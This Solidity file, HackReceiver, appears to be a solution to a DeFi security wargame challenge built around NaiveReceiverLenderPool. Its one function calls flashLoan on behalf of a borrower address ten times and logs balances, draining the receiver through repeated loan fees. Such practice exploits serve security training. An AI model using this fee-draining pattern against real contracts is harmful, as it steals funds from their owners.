// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

import "./NaiveReceiverLenderPool.sol";

contract HackReceiver {
    function drainAllFunds(address payable pool, address payable borrower) external {
        for (int i=0; i<10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(borrower, 1);
            console.log("pool ether: %s, receiver ether: %s", address(pool).balance,address(borrower).balance);
        }
    }
    receive () external payable {}
}
